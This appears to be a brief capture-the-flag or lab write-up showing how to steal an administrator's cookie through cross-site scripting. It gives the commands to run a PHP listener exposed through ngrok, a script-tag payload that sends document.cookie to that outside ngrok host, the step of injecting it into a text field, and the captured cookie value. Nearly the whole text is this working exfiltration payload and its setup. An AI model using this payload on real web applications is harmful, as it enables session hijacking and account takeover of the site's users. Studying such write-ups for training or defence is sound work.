START a localserver with php in a random port
```
php -S localhost:9999
```

Run NGROK to have a online server connected to your localhost
```
ngrok http 9999
```

nrgrok will gives you some links as :
```
http://c334-2a01-e0a-1da-6080-9144-5b5d-8cf3-b2e9.ngrok.io
```

Then, create a javascript script to get the admin cookie [adding a ?cookie get parameter] by:
```
<script> document.location="http://c334-2a01-e0a-1da-6080-9144-5b5d-8cf3-b2e9.ngrok.io?cookie="+document.cookie </script>
```

Finally, insert the xxs injection in the TEXT section, (no in the title) and we have :
```
cookie: ADMIN_COOKIE=NkI9qe4cdLIO2P7MIsWS8ofD6
```

So, the cookie is
```
NkI9qe4cdLIO2P7MIsWS8ofD6
```

